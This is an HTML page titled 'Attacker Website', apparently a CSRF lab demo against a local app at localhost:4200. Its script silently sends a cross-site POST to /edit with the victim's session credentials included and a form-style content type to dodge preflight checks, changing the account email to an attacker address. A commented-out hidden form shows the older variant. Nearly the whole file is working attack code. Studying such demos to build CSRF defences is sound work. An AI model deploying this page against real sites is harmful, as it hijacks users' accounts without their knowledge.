<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8" />
		<meta http-equiv="X-UA-Compatible" content="IE=edge" />
		<meta name="viewport" content="width=	, initial-scale=1.0" />
		<title>Attacker Website</title>
	</head>
	<body>
		<div>
			<h1>Some nice website!</h1>
			<!-- BAD WAY! -->
			<!-- <form name="form" action="http:localhost:4200/edit" method="POST">
				<input type="hidden" name="email" value="hacker@hack.com" />
			</form> -->
		</div>
		<script>
			// BAD WAY!
			//document.form.submit();

			fetch("http://localhost:4200/edit", {
				method: "POST",

				// Avoid console errors
				mode: "no-cors",

				// Take session credentials (sid)
				credentials: "include",

				// send a header to fool the browser
				// as you were sending data from a form
				headers: {
					"Content-Type": "application/x-www-form-urlencoded",
				},
				// body as parameters
				body: "email=hacker@hack.com",
			})
				.then((res) => console.log(res.status))
				.catch((err) => console.log(err));
		</script>
	</body>
</html>
